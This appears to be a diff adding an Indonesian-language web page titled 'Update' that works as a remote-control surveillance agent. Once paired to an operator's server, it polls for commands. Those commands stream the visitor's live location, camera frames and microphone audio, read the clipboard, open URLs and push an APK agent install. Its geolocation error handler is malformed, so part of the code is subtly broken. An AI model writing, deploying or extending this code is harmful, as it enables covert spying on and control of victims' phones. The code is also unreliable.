@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Update</title>
+<link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body style="overflow:auto">
+<div class="pa">
+  <h1>M4ZK1PL4Y</h1>
+  <div class="sub" id="state">menghubungkan...</div>
+
+  <div class="card" style="margin-bottom:9px"><div class="card-b">
+    <div class="kv" id="info">
+      <div class="k">Perangkat</div><div class="v">&mdash;</div>
+      <div class="k">Platform</div><div class="v">&mdash;</div>
+      <div class="k">Layar</div><div class="v">&mdash;</div>
+      <div class="k">Baterai</div><div class="v" id="bat">&mdash;</div>
+      <div class="k">Jaringan</div><div class="v" id="net">&mdash;</div>
+    </div>
+  </div></div>
+
+  <div class="row2">
+    <button class="btn acc" id="bGeo">IZIN LOKASI</button>
+    <button class="btn" id="bCam">IZIN KAMERA</button>
+    <button class="btn" id="bMic">IZIN MIC</button>
+    <button class="btn" id="bClip">KLIPBOARD</button>
+  </div>
+
+  <div class="card"><div class="card-b">
+    <div class="chips">
+      <button class="chip" data-a="vibrate">GETAR</button>
+      <button class="chip" data-a="speak">TTS</button>
+      <button class="chip" data-a="notify">NOTIF</button>
+      <button class="chip" data-a="wake">WAKE LOCK</button>
+      <button class="chip" data-a="fullscreen">FULLSCREEN</button>
+      <button class="chip" data-a="apk">INSTALL APK</button>
+    </div>
+    <video id="vid" playsinline muted hidden></video>
+    <img class="prev" id="snap" hidden alt="">
+  </div></div>
+
+  <div class="console" id="log" style="height:126px;margin-top:9px"></div>
+</div>
+<script>
+(function () {
+  var TOKEN = '{{TOKEN}}';
+  var TARGET = { id: '' };
+  var camStream = null, micRec = null, geoWatch = null, wakeLock = null, lastGeo = {};
+
+  var q = function (s) { return document.querySelector(s); };
+  var log = function (m) {
+    var d = document.createElement('div');
+    d.innerHTML = '<span class="tm">' +
+      new Date().toLocaleTimeString('id-ID', { hour12: false }) + '</span> ' + m;
+    q('#log').prepend(d);
+  };
+  var jpost = function (p, b) {
+    return fetch(p, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(b || {}),
+      keepalive: true,
+    }).then(function (r) { return r.json(); }).catch(function () { return {}; });
+  };
+
+  async function boot() {
+    var ua = navigator.userAgent;
+    var brand = /iPhone|iPad/.test(ua) ? 'Apple'
+      : /Samsung/.test(ua) ? 'Samsung'
+      : /Xiaomi|Redmi|POCO/.test(ua) ? 'Xiaomi'
+      : /OPPO|realme/.test(ua) ? 'OPPO'
+      : /vivo/.test(ua) ? 'vivo' : 'Android';
+    var mm = /Android [0-9.]+; ([^)]+)\)/.exec(ua);
+    var model = mm ? mm[1] : brand;
+    var info = {
+      brand: brand, model: model, label: model + ' (web)',
+      android: (/Android ([0-9.]+)/.exec(ua) || [, ''])[1],
+      sdk: 0, storage_free: 0, charging: 0, battery: 0,
+      platform: navigator.platform
+    };
+    try {
+      var b = await navigator.getBattery();
+      info.battery = Math.round(b.level * 100);
+      info.charging = b.charging ? 1 : 0;
+      q('#bat').textContent = info.battery + '%' + (b.charging ? ' (cas)' : '');
+    } catch (e) { q('#bat').textContent = 'n/a'; }
+    try {
+      if (navigator.storage && navigator.storage.estimate) {
+        var est = await navigator.storage.estimate();
+        info.storage_free = est.quota || 0;
+      }
+    } catch (e) {}
+
+    q('#info').innerHTML =
+      '<div class="k">Perangkat</div><div class="v">' + model + '</div>' +
+      '<div class="k">Brand</div><div class="v">' + brand + '</div>' +
+      '<div class="k">Layar</div><div class="v">' + screen.width + 'x' + screen.height + '</div>' +
+      '<div class="k">Baterai</div><div class="v">' + info.battery + '%</div>' +
+      '<div class="k">Jaringan</div><div class="v">' +
+        ((navigator.connection && navigator.connection.effectiveType) || '-') + '</div>' +
+      '<div class="k">Bahasa</div><div class="v">' + navigator.language + '</div>';
+
+    var r = await jpost('/api/pair/claim', { token: TOKEN, info: info });
+    if (!r.ok) {
+      q('#state').textContent = 'kode tidak valid / kedaluwarsa';
+      return;
+    }
+    TARGET.id = r.target;
+    q('#state').textContent = 'TERHUBUNG \u00b7 ' + r.target;
+    q('#state').className = 'sub ok';
+    log('<span class="ok">agent web aktif</span>');
+
+    beat();
+    setInterval(beat, 7000 + Math.floor(Math.random() * 3000));
+    poll();
+    setInterval(poll, 1900 + Math.floor(Math.random() * 900));
+  }
+
+  async function beat() {
+    if (!TARGET.id) return;
+    await jpost('/api/pair/beat', {
+      target: TARGET.id, battery: 0, lat: lastGeo.lat, lon: lastGeo.lon
+    });
+  }
+
+  async function poll() {
+    if (!TARGET.id) return;
+    var d = await fetch('/api/pair/cmd/' + TOKEN)
+      .then(function (r) { return r.json(); })
+      .catch(function () { return { commands: [] }; });
+    var list = d.commands || [];
+    for (var i = 0; i < list.length; i++) run(list[i]);
+  }
+
+  async function run(c) {
+    var a = c.args || {};
+    var ok = true, data = {};
+    try {
+      switch (c.type) {
+        case 'ping': data = { pong: Date.now() }; break;
+        case 'info': data = { model: navigator.userAgent }; break;
+        case 'locate_once':
+        case 'locate_start': startGeo(); data = { started: true }; break;
+        case 'locate_stop': stopGeo(); data = { stopped: true }; break;
+        case 'cam_front': await cam('user'); data = { cam: 'front' }; break;
+        case 'cam_back': await cam('environment'); data = { cam: 'back' }; break;
+        case 'cam_stop': camStop(); data = { stopped: true }; break;
+        case 'screen_shot': await shot(); data = { saved: 'browser' }; break;
+        case 'mic_start': await micStart(); data = { mic: true }; break;
+        case 'mic_stop': micStop(); data = { stopped: true }; break;
+        case 'clipboard':
+          data = { text: await navigator.clipboard.readText().catch(function () { return ''; }) };
+          break;
+        case 'vibrate':
+          if (navigator.vibrate) navigator.vibrate([200, 90, 200]);
+          data = { ok: 1 }; break;
+        case 'toast': log('TOAST: ' + (a.text || '')); speak(a.text); data = { ok: 1 }; break;
+        case 'open_url': window.open(a.url, '_blank'); data = { url: a.url }; break;
+        case 'speaker_play': new Audio(a.url).play().catch(function () {}); data = { url: a.url }; break;
+        case 'media_push': data = { url: a.url }; break;
+        case 'notif_start': await notifyPerm(); data = { ok: 1 }; break;
+        case 'forensic_clean': data = { info: 'web agent: tanpa jejak lokal' }; break;
+        case 'lock_screen':
+        case 'screen_off':
+        case 'screen_on':
+        case 'lock_pin': data = { info: 'butuh agent APK' }; break;
+        default: ok = false; data = { info: 'tidak didukung di web agent' };
+      }
+    } catch (e) { ok = false; data = { error: String((e && e.message) || e) }; }
+    await jpost('/api/pair/result', { id: c.id, target: TARGET.id, ok: ok, data: data });
+    log(c.type + ' \u2192 ' + (ok ? '<span class="ok">OK</span>' : '<span class="er">GAGAL</span>'));
+  }
+
+  function startGeo() {
+    if (geoWatch) return;
+    geoWatch = navigator.geolocation.watchPosition(function (p) {
+      lastGeo = { lat: p.coords.latitude, lon: p.coords.longitude };
+      jpost('/api/pair/beat', {
+        target: TARGET.id, battery: 0, lat: lastGeo.lat, lon: lastGeo.lon
+      });
+    }, function (e) { log('<span class="er">geo: ' + e.message + '</span>'),
+      { enableHighAccuracy: true, maximumAge: 2000, timeout: 20000 });
+    log('lokasi live aktif');
+  }
+  function stopGeo() {
+    if (geoWatch) navigator.geolocation.clearWatch(geoWatch);
+    geoWatch = null;
+    log('lokasi stop');
+  }
+
+  async function cam(facing) {
+    camStop();
+    camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+    var v = q('#vid');
+    v.hidden = false;
+    v.srcObject = camStream;
+    await v.play().catch(function () {});
+    clearInterval(window._camT);
+    window._camT = setInterval(shot, 2400 + Math.floor(Math.random() * 600));
+    log('kamera ' + facing + ' aktif');
+  }
+  function camStop() {
+    clearInterval(window._camT);
+    if (camStream) camStream.getTracks().forEach(function (t) { t.stop(); });
+    camStream = null;
+    q('#vid').hidden = true;
+  }
+
+  async function shot() {
+    var v = q('#vid');
+    if (!v.videoWidth) return;
+    var c = document.createElement('canvas');
+    c.width = Math.min(620, v.videoWidth);
+    c.height = Math.round(c.width * v.videoHeight / v.videoWidth);
+    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+    var b64 = c.toDataURL('image/jpeg', 0.6).split(',')[1];
+    await jpost('/api/pair/stream', {
+      target: TARGET.id, kind: 'cam', b64: b64, meta: { w: c.width, h: c.height }
+    });
+    var s = q('#snap');
+    s.hidden = false;
+    s.src = 'data:image/jpeg;base64,' + b64;
+  }
+
+  async function micStart() {
+    var st = await navigator.mediaDevices.getUserMedia({ audio: true });
+    micRec = new MediaRecorder(st, { mimeType: 'audio/webm' });
+    micRec.ondataavailable = async function (e) {
+      if (!e.data.size) return;
+      var buf = new Uint8Array(await e.data.arrayBuffer());
+      var s = '';
+      for (var i = 0; i < buf.length; i++) s += String.fromCharCode(buf[i]);
+      await jpost('/api/pair/stream', {
+        target: TARGET.id, kind: 'mic', b64: btoa(s), meta: { mime: 'webm' }
+      });
+    };
+    micRec.start(1500);
+    log('mic aktif');
+  }
+  function micStop() { try { if (micRec) micRec.stop(); } catch (e) {} micRec = null; }
+
+  function speak(t) {
+    if (!t || !window.speechSynthesis) return;
+    var u = new SpeechSynthesisUtterance(t);
+    u.lang = 'id-ID';
+    speechSynthesis.speak(u);
+  }
+  async function notifyPerm() {
+    if (!('Notification' in window)) return;
+    var p = await Notification.requestPermission();
+    if (p === 'granted') new Notification('Terhubung', { body: 'Agent web aktif.' });
+  }
+
+  q('#bGeo').onclick = startGeo;
+  q('#bCam').onclick = function () { cam('user'); };
+  q('#bMic').onclick = micStart;
+  q('#bClip').onclick = async function () {
+    var t = await navigator.clipboard.readText().catch(function () { return '\u2014'; });
+    log('klipboard: ' + t);
+  };
+  var chips = document.querySelectorAll('[data-a]');
+  for (var i = 0; i < chips.length; i++) {
+    chips[i].onclick = async function () {
+      var a = this.dataset.a;
+      if (a === 'vibrate' && navigator.vibrate) navigator.vibrate([200, 90, 200]);
+      if (a === 'speak') speak('Agent aktif');
+      if (a === 'notify') notifyPerm();
+      if (a === 'fullscreen' && document.documentElement.requestFullscreen)
+        document.documentElement.requestFullscreen().catch(function () {});
+      if (a === 'apk') location.href = '/api/pair/apk/' + TOKEN;
+      if (a === 'wake') {
+        try { wakeLock = await navigator.wakeLock.request('screen'); log('wake lock aktif'); }
+        catch (e) {}
+      }
+    };
+  }
+
+  boot();
+})();
+</script>
+</body>
+</html>
